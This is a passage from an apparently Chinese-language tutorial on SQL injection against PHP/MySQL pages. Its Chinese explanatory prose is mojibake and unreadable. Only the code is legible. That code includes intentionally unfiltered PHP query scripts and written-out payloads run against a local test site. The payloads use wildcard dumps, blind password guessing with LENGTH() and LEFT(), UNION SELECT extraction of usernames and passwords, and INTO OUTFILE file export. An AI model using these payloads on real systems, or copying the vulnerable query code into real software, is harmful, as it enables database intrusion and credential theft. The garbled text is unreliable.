´åä½œç”¨ï¼Œä¸è¦å¤ªæ‹…å¿ƒã€‚ä¸è¿‡æ³„éœ²éšç§ä¸çŸ¥é“ç®—ä¸ç®—å±å®³ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æœç´¢å¼•æ“ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;form method="GET" action="search.php" &gt;<br />&lt;input name="keywords" type="text" value="" size="15"&gt; &lt;input type="submit" value="Search"&gt;<br />&lt;/form&gt;<br />&lt;p&gt;&lt;b&gt;Search result&lt;/b&gt;&lt;/p&gt;</span></p><p><span style="color:#0000ff;">&lt;?php<br />$servername = "localhost";<br />$dbusername = "root";<br />$dbpassword = "";<br />$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("æ•°æ®åº“è¿æ¥å¤±è´¥");</span></p><p><span style="color:#0000ff;">$keywords = $_GET['keywords'];<br />if (!empty($keywords)) {<br />ã€€ã€€//$keywords = addslashes($keywords);<br />ã€€ã€€//$keywords = str_replace("_","\_",$keywords);<br />ã€€ã€€//$keywords = str_replace("%","\%",$keywords);</span></p><p><span style="color:#0000ff;">ã€€ã€€$sql = "SELECT * FROM ".$db_prefix."article WHERE title LIKE '%$keywords%' $search ORDER BY title DESC";<br />ã€€ã€€$result = mysql_db_query($dbname,$sql);<br />ã€€ã€€$tatol=mysql_num_rows($result);</span></p><p><span style="color:#0000ff;">ã€€ã€€echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";</span></p><p><span style="color:#0000ff;">ã€€ã€€if ($tatol &lt;=0){<br />ã€€ã€€ã€€ã€€echo "The \"&lt;b&gt;$keywords&lt;/b&gt;\" was not found in all the record.&lt;p&gt;\n";<br />ã€€ã€€} else {<br />ã€€ã€€ã€€ã€€while ($article=mysql_fetch_array($result)) {<br />ã€€ã€€ã€€ã€€ã€€ã€€echo "&lt;li&gt;".htmlspecialchars($article[title])."&lt;p&gt;\n";<br />ã€€ã€€ã€€ã€€} //while<br />ã€€ã€€}<br />} else {<br />ã€€ã€€echo "&lt;b&gt;Please enter some keywords.&lt;/b&gt;&lt;p&gt;\n";<br />}<br />?&gt;</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä¸€èˆ¬ç¨‹åºéƒ½æ˜¯è¿™æ ·å†™çš„ï¼Œå¦‚æœç¼ºä¹å˜é‡æ£€æŸ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å†™å˜é‡ï¼Œè¾¾åˆ°â€œæ³¨å…¥â€çš„ç›®çš„ï¼Œå°½ç®¡æ²¡æœ‰å±å®³ï¼Œå½“æˆ‘ä»¬è¾“å…¥â€œ___â€ ã€â€œ.__ â€ã€â€œ%â€ç­‰ç±»ä¼¼çš„å…³é”®å­—æ—¶ï¼Œä¼šæŠŠæ•°æ®åº“ä¸­çš„æ‰€æœ‰è®°å½•éƒ½å–å‡ºæ¥ã€‚å¦‚æœæˆ‘ä»¬åœ¨è¡¨å•æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">%' ORDER BY articleid/*<br />%' ORDER BY articleid#<br />__' ORDER BY articleid/*<br />__' ORDER BY articleid#</span></p></td></tr></tbody></table></div><p>ã€€ã€€SQLè¯­å¥å°±è¢«æ”¹å˜æˆä¸‹é¢çš„æ ·å­äº†ï¼Œ</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE title LIKE '%%' ORDER BY articleid/*%' ORDER BY title DESC<br />SELECT * FROM article WHERE title LIKE '%__' ORDER BY articleid#%' ORDER BY title DESC</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±ä¼šåˆ—å‡ºæ‰€æœ‰è®°å½•ï¼ŒåŒ…æ‹¬è¢«éšè—çš„ï¼Œè¿˜å¯ä»¥æ”¹å˜æ’åˆ—é¡ºåºã€‚è¿™ä¸ªè™½ç„¶å±å®³ä¸å¤§ï¼Œä¹Ÿç®—æ˜¯æ³¨å…¥çš„ä¸€ç§æ–¹å¼äº†å§ï¼Ÿ</p><p><span style="font-weight:700;">äºŒã€æŸ¥è¯¢å­—æ®µ</span></p><p>ã€€ã€€æŸ¥è¯¢å­—æ®µåˆå¯ä»¥åˆ†æˆä¸¤ç§ï¼Œæœ¬è¡¨æŸ¥è¯¢å’Œè·¨è¡¨æŸ¥è¯¢ï¼Œè¿™ä¸¤ç§æŸ¥è¯¢å’ŒACCESSã€MSSQLå·®ä¸å¤šï¼Œç”šè‡³æ›´å¼ºå¤§ã€æ›´çµæ´»ã€æ›´æ–¹ä¾¿ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±æ˜¯æœ‰äººè®¤ä¸ºæ¯”ASPéš¾ï¼Ÿæˆ‘ä»¬åœ¨ASPä¸­ç»å¸¸ä½¿ç”¨çš„ä¸ªåˆ«å‡½æ•°åœ¨PHPé‡Œè¦æœ‰å°å°çš„æ”¹åŠ¨ï¼Œå¦‚ä¸‹ï¼š</p><p><span style="font-weight:700;">â‘  æœ¬è¡¨æŸ¥è¯¢</span></p><p>ã€€ã€€çœ‹ä¸‹é¢ä¸€æ¡SQLè¯­å¥ï¼Œå¤šç”¨åœ¨è®ºå›æˆ–è€…ä¼šå‘˜æ³¨å†Œç³»ç»ŸæŸ¥çœ‹ç”¨æˆ·èµ„æ–™çš„ï¼Œ</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br />$servername = "localhost";<br />$dbusername = "root";<br />$dbpassword = "";<br />$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("æ•°æ®åº“è¿æ¥å¤±è´¥");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM user WHERE username='$username'";<br />$result = mysql_db_query($dbname,$sql);<br />$row = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (!$row) {<br />ã€€ã€€echo "è¯¥è®°å½•ä¸å­˜åœ¨";<br />ã€€ã€€echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br />ã€€ã€€exit;<br />}</span></p><p><span style="color:#0000ff;">echo "ä½ è¦æŸ¥è¯¢çš„ç”¨æˆ·IDæ˜¯ï¼š$row[userid]\n";<br />echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br />?&gt;</span></p></td></tr></tbody></table></div><p>ã€€ã€€å½“æˆ‘ä»¬æäº¤çš„ç”¨æˆ·åä¸ºçœŸæ—¶ï¼Œå°±ä¼šæ­£å¸¸è¿”å›ç”¨æˆ·çš„IDï¼Œå¦‚æœä¸ºéæ³•å‚æ•°å°±ä¼šæç¤ºç›¸åº”çš„é”™è¯¯ï¼Œç”±äºæ˜¯æŸ¥è¯¢ç”¨æˆ·èµ„æ–™ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çŒœæµ‹å¯†ç å°±å­˜åœ¨è¿™ä¸ªæ•°æ®è¡¨é‡Œï¼ˆç°åœ¨æˆ‘è¿˜æ²¡æœ‰ç¢°è§è¿‡å¯†ç æ˜¯å•ç‹¬å­˜åœ¨å¦ä¸€ä¸ªè¡¨çš„ç¨‹åºï¼‰ï¼Œè®°å¾—åˆšæ‰çš„èº«ä»½éªŒè¯ç¨‹åºå—ï¼Ÿå’Œç°åœ¨çš„ç›¸æ¯”ï¼Œå°±å°‘äº†ä¸€ä¸ªANDæ¡ä»¶ï¼Œå¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='$username' AND password='$password'SELECT * FROM user WHERE username='$username'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç›¸åŒçš„å°±æ˜¯å½“æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œå°±ä¼šç»™å‡ºæ­£ç¡®çš„æç¤ºä¿¡æ¯ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ å‡ºåé¢çš„ANDæ¡ä»¶éƒ¨åˆ†ï¼Œå¹¶ä½¿è¿™éƒ¨åˆ†ä¸ºçœŸï¼Œé‚£æˆ‘ä»¬çš„ç›®çš„ä¹Ÿå°±è¾¾åˆ°äº†ï¼Œè¿˜æ˜¯åˆ©ç”¨åˆšæ‰å»ºç«‹çš„useræ•°æ®åº“ï¼Œç”¨æˆ·åä¸ºangelï¼Œå¯†ç ä¸ºmypassï¼Œ<br />çœ‹äº†ä¸Šé¢çš„ä¾‹å­ï¼Œåº”è¯¥çŸ¥é“æ„é€ äº†å§ï¼Œå¦‚æœæˆ‘ä»¬æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and password='mypass</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™ä¸ªæ˜¯ç»å¯¹ä¸ºçœŸçš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿™æ ·æäº¤ä¸Šé¢çš„SQLè¯­å¥å˜æˆäº†ä¸‹é¢çš„æ ·å­ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='angel' AND password='mypass'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä½†åœ¨å®é™…çš„æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬æ˜¯è‚¯å®šä¸çŸ¥é“å¯†ç çš„ï¼Œå‡è®¾æˆ‘ä»¬çŸ¥é“æ•°æ®åº“çš„å„ä¸ªå­—æ®µï¼Œä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹æ¢æµ‹å¯†ç äº†ï¼Œé¦–å…ˆè·å–å¯†ç é•¿åº¦ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and LENGTH(password)='6</span></p></td></tr></tbody></table></div><p>ã€€ã€€åœ¨ACCESSä¸­ï¼Œç”¨LEN()å‡½æ•°æ¥è·å–å­—ç¬¦ä¸²é•¿åº¦ï¼Œåœ¨MYSQLä¸­ï¼Œè¦ä½¿ç”¨LENGTH()ï¼Œåªè¦æ²¡æœ‰æ„é€ é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¯´SQLè¯­å¥èƒ½æ­£å¸¸æ‰§è¡Œï¼Œé‚£è¿”å›ç»“æœæ— å¤–ä¹ä¸¤ç§ï¼Œä¸æ˜¯è¿”å›ç”¨æˆ·IDï¼Œå°±æ˜¯è¿”å›â€œè¯¥è®°å½•ä¸å­˜åœ¨â€ã€‚å½“ç”¨æˆ·åä¸ºangelå¹¶ä¸”å¯†ç é•¿åº¦ä¸º6çš„æ—¶å€™è¿”å›çœŸï¼Œå°±ä¼šè¿”å›ç›¸å…³è®°å½•ï¼Œæ˜¯ä¸æ˜¯å’ŒASPé‡Œä¸€æ ·ï¼Ÿå†ç”¨LEFT()ã€RIGHT()ã€MID()å‡½æ•°çŒœå¯†ç ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,1)='m<br />http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,2)='my<br />http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,3)='myp<br />http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,4)='mypa<br />http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,5)='mypas<br />http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,6)='mypass</span></p></td></tr></tbody></table></div><p>ã€€ã€€çœ‹ï¼Œå¯†ç ä¸æ˜¯å‡ºæ¥äº†å—ï¼Ÿç®€å•å§ï¼Ÿå½“ç„¶å®é™…æƒ…å†µä¼šæœ‰ä¸å°‘æ¡ä»¶é™åˆ¶ï¼Œä¸‹é¢è¿˜ä¼šè®²åˆ°è¿™ä¸ªä¾‹å­çš„æ·±å…¥åº”ç”¨ã€‚</p><p><span style="font-weight:700;">â‘¡ è·¨è¡¨æŸ¥è¯¢</span></p><p>ã€€ã€€è¿™éƒ¨åˆ†å°±å’ŒASPæœ‰ç‚¹å‡ºå…¥äº†ï¼Œé™¤äº†ä¸€å®šè¦ç”¨UNIONè¿æ¥ä¸¤æ¡SQLè¯­å¥ï¼Œæœ€éš¾æŒæ¡çš„å°±æ˜¯å­—æ®µçš„æ•°é‡ï¼Œå¦‚æœçœ‹è¿‡MYSQLå‚è€ƒæ‰‹å†Œï¼Œå°±çŸ¥é“äº†åœ¨ SELECT ä¸­çš„ select_expression (select_expression è¡¨ç¤ºä½ å¸Œæœ›æ£€ç´¢çš„åˆ—[å­—æ®µ]) éƒ¨åˆ†åˆ—å‡ºçš„åˆ—å¿…é¡»å…·æœ‰åŒæ ·çš„ç±»å‹ã€‚ç¬¬ä¸€ä¸ª SELECT æŸ¥è¯¢ä¸­ä½¿ç”¨çš„åˆ—åå°†ä½œä¸ºç»“æœé›†çš„åˆ—åè¿”å›ã€‚ç®€å•çš„è¯´ï¼Œä¹Ÿå°±æ˜¯UNIONåé¢æŸ¥é€‰çš„å­—æ®µæ•°é‡ã€å­—æ®µç±»å‹éƒ½åº”è¯¥ä¸å‰é¢çš„SELECTä¸€æ ·ï¼Œè€Œä¸”ï¼Œå¦‚æœå‰é¢çš„SELECTä¸ºçœŸï¼Œå°±åŒæ—¶è¿”å›ä¸¤ä¸ªSELECTçš„ç»“æœï¼Œå½“å‰é¢çš„SELECTä¸ºå‡ï¼Œå°±ä¼šè¿”å›ç¬¬äºŒä¸ªSELECTæ‰€å¾—çš„ç»“æœï¼ŒæŸäº›æƒ…å†µä¼šæ›¿æ¢æ‰åœ¨ç¬¬ä¸€ä¸ªSELECTåŸæ¥åº”è¯¥æ˜¾ç¤ºçš„å­—æ®µï¼Œå¦‚ä¸‹å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="405" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/union.gif" width="700" style="border:0px;" /></p><p>ã€€ã€€çœ‹äº†è¿™ä¸ªå›¾ç›´è§‚å¤šäº†å§ï¼Ÿæ‰€ä»¥åº”è¯¥å…ˆçŸ¥é“å‰é¢æŸ¥è¯¢è¡¨çš„æ•°æ®è¡¨çš„ç»“æ„ã€‚å¦‚æœæˆ‘ä»¬æŸ¥è¯¢ä¸¤ä¸ªæ•°æ®è¡¨çš„å­—æ®µç›¸åŒï¼Œç±»å‹ä¹Ÿç›¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿™æ ·æäº¤:</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT * FROMâ€¦â€¦</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚æœå­—æ®µæ•°é‡ã€å­—æ®µç±»å‹ä»»æ„ä¸€ä¸ªä¸ç›¸åŒï¼Œå°±åªèƒ½ææ¸…é™¤æ•°æ®ç±»å‹å’Œå­—æ®µæ•°é‡ï¼Œè¿™æ ·æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT 1,1,1,1,1,1,1 FROMâ€¦â€¦</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦åˆ™å°±ä¼šæŠ¥é”™ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">The used SELECT statements have a different number of columns</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚æœä¸çŸ¥é“æ•°æ®ç±»å‹å’Œå­—æ®µæ•°é‡ï¼Œå¯ä»¥ç”¨1æ¥æ…¢æ…¢è¯•ï¼Œå› ä¸º1å±äºint\str\varç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ…¢æ…¢æ”¹å˜æ•°é‡ï¼Œä¸€å®šå¯ä»¥çŒœåˆ°çš„ã€‚å¦‚æœä¸èƒ½é©¬ä¸Šç†è§£ä¸Šé¢çš„ç†è®ºï¼Œåé¢æœ‰å¾ˆè¯¦ç»†çš„ä¾‹å­ã€‚<br />ã€€ã€€æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢çš„æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ç« æ•°æ®è¡¨ã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `article` (<br />`articleid` int(11) NOT NULL auto_increment,<br />`title` varchar(100) NOT NULL default '',<br />`content` text NOT NULL,<br />PRIMARY KEY (`articleid`)<br />) TYPE=MyISAM AUTO_INCREMENT=3 ;</span></p><p><span style="color:#0000ff;">#<br /># å¯¼å‡ºè¡¨ä¸­çš„æ•°æ® `article`<br />#</span></p><p><span style="color:#0000ff;">INSERT INTO `article` VALUES (1, 'æˆ‘æ˜¯ä¸€ä¸ªä¸çˆ±è¯»ä¹¦çš„å­©å­', 'ä¸­å›½çš„æ•™è‚²åˆ¶åº¦çœŸæ˜¯ä»–å¦ˆçš„è½åï¼å¦‚æœæˆ‘å½“æ•™è‚²éƒ¨é•¿ã€‚æˆ‘è¦æŠŠæ‰€æœ‰è€å¸ˆéƒ½è§£é›‡ï¼');<br />INSERT INTO `article` VALUES (2, 'æˆ‘æ¨æ­»ä½ ', 'æˆ‘æ¨æ­»ä½ äº†ï¼Œä½ æ˜¯ä»€ä¹ˆä¸œè¥¿å•Š');</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™ä¸ªè¡¨çš„å­—æ®µç±»å‹åˆ†åˆ«æ˜¯intã€varcharã€textï¼Œå¦‚æœæˆ‘ä»¬ç”¨UNIONè”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼Œåé¢çš„æŸ¥è¯¢çš„è¡¨çš„ç»“æ„å’Œè¿™ä¸ªä¸€æ ·ã€‚å°±å¯ä»¥ç”¨â€œSELECT *â€ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªä¸ä¸€æ ·ï¼Œé‚£æˆ‘ä»¬åªèƒ½ç”¨â€œSELECT 1,1,1,1â€¦â€¦â€äº†ã€‚</p><p>ã€€ã€€ä¸‹é¢çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªå¾ˆæ ‡å‡†ã€ç®€å•çš„æ˜¾ç¤ºæ–‡ç« çš„æ–‡ä»¶ï¼Œå¾ˆå¤šç«™ç‚¹éƒ½æ˜¯è¿™ç§é¡µé¢æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æˆä¸ºæœ€æ˜æ˜¾çš„æ³¨å…¥ç‚¹ï¼Œä¸‹é¢å°±æ‹¿è¿™ä¸ªæ–‡ä»¶ä½œä¸ºä¾‹å­ï¼Œå¼€å§‹æˆ‘ä»¬çš„æ³¨å…¥å®éªŒã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br />$servername = "localhost";<br />$dbusername = "root";<br />$dbpassword = "";<br />$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("æ•°æ®åº“è¿æ¥å¤±è´¥");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM article WHERE articleid='$id'";<br />$result = mysql_db_query($dbname,$sql);<br />$row = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (!$row)<br />{<br />ã€€ã€€echo "è¯¥è®°å½•ä¸å­˜åœ¨";<br />ã€€ã€€echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br />ã€€ã€€exit;<br />}</span></p><p><span style="color:#0000ff;">echo "title&lt;br&gt;".$row[title]."&lt;p&gt;\n";<br />echo "content&lt;br&gt;".$row[content]."&lt;p&gt;\n";<br />echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br />?&gt;</span></p></td></tr></tbody></table></div><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æäº¤è¿™æ ·çš„ä¸€ä¸ªè¯·æ±‚ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±ä¼šæ˜¾ç¤ºarticleidä¸º1çš„æ–‡ç« ï¼Œä½†æˆ‘ä»¬ä¸éœ€è¦æ–‡ç« ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œå°±è¦æŸ¥è¯¢userè¡¨ï¼Œç°åœ¨æ˜¯æŸ¥è¯¢åˆšæ‰æˆ‘ä»¬å»ºç«‹çš„userè¡¨ã€‚<br />ã€€ã€€ç”±äº$idæ²¡æœ‰è¿‡æ»¤ç»™æˆ‘ä»¬åˆ¶é€ äº†è¿™ä¸ªæœºä¼šï¼Œæˆ‘ä»¬è¦æŠŠshow.phpæ–‡ä»¶ä¸­çš„SQLè¯­å¥æ”¹å†™æˆç±»ä¼¼è¿™ä¸ªæ ·å­ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT * FROM user â€¦â€¦</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”±äºè¿™ä¸ªä»£ç æ˜¯æœ‰å•å¼•å·åŒ…å«ç€å˜é‡çš„ï¼Œæˆ‘ä»¬ç°åœ¨æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1' union select 1,username,password from user/*</span></p></td></tr></tbody></table></div><p>ã€€ã€€æŒ‰é“ç†è¯´ï¼Œåº”è¯¥æ˜¾ç¤ºç”¨æˆ·è¡¨çš„usernameã€passwordä¸¤ä¸ªå­—æ®µçš„å†…å®¹æ‰å¯¹å•Šï¼Œæ€ä¹ˆæ­£å¸¸æ˜¾ç¤ºæ–‡ç« å‘¢ï¼Ÿå¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="180" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php2.gif" width="778" style="border:0px;" /></p><p>ã€€ã€€å…¶å®ï¼Œæˆ‘ä»¬æäº¤çš„articleid=1æ˜¯articleè¡¨é‡Œå­˜åœ¨çš„ï¼Œæ‰§è¡Œç»“æœå°±æ˜¯çœŸäº†ï¼Œè‡ªç„¶è¿”å›å‰é¢SELECTçš„ç»“æœï¼Œå½“æˆ‘ä»¬æäº¤ç©ºçš„å€¼æˆ–è€…æäº¤ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼ï¼Œå°±ä¼šè¹¦å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user/*<br />http://127.0.0.1/injection/show.php?id=99999' union select 1,username,password from user/*</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="180" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php3.gif" width="770" style="border:0px;" /></p><p>ã€€ã€€ç°åœ¨å°±åœ¨å­—æ®µç›¸å¯¹åº”çš„åœ°æ–¹æ˜¾ç¤ºå‡ºæˆ‘ä»¬æ‰€è¦çš„å†…å®¹ã€‚å¦‚æœè¿˜ä¸æ¸…æ¥šæ€è·¯ä»¥åŠå…·ä½“çš„åº”ç”¨ï¼Œåé¢è¿˜ä¼šè®²åˆ°ä¸€äº›é«˜çº§çš„æŠ€å·§ã€‚</p><p><span style="font-weight:700;">ä¸‰ã€å¯¼å‡ºæ–‡ä»¶</span></p><p>ã€€ã€€è¿™ä¸ªæ˜¯æ¯”è¾ƒå®¹æ˜“æ„é€ ä½†åˆæœ‰ä¸€å®šé™åˆ¶çš„æŠ€æœ¯ï¼Œæˆ‘ä»¬ç»å¸¸å¯ä»¥çœ‹è§ä»¥ä¸‹çš„SQLè¯­å¥ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">select * from table into outfile 'c:/file.txt'<br />select * from table into outfile '/var/www/file.txt'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä½†è¿™æ ·çš„è¯­å¥ï¼Œä¸€èˆ¬å¾ˆå°‘ç”¨åœ¨ç¨‹åºé‡Œï¼Œæœ‰è°ä¼šæŠŠè‡ªå·±çš„æ•°æ®å¯¼å‡ºå‘¢ï¼Ÿé™¤éæ˜¯å¤‡ä»½ï¼Œä½†æˆ‘ä¹Ÿæ²¡æœ‰è§è¿‡è¿™ç§å¤‡ä»½æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±æ„é€ ï¼Œä½†å¿…é¡»æœ‰ä¸‹é¢çš„å‰ææ¡ä»¶ï¼š</p><ul style="list-style:none;color:rgb(69,69,69);"><li>å¿…é¡»å¯¼å‡ºåˆ°èƒ½è®¿é—®çš„ç›®å½•ï¼Œè¿™æ ·æ‰èƒ½ä¸‹è½½ã€‚</li><li>èƒ½è®¿é—®çš„ç›®å½•å¿…é¡»è¦æœ‰å¯å†™çš„æƒé™ï¼Œå¦åˆ™å¯¼å‡ºä¼šå¤±è´¥ã€‚</li><li>ç¡®ä¿ç¡¬ç›˜æœ‰è¶³å¤Ÿçš„å®¹é‡èƒ½å®¹ä¸‹å¯¼å‡ºçš„æ•°æ®ï¼Œè¿™ä¸ªå¾ˆå°‘è§ã€‚</li><li>ç¡®ä¿è¦å·²ç»å­˜åœ¨ç›¸åŒçš„æ–‡ä»¶åï¼Œä¼šå¯¼è‡´å¯¼å‡ºå¤±è´¥ï¼Œå¹¶æç¤ºï¼šâ€œFile 'c:/file.txt' already existsâ€ï¼Œè¿™æ 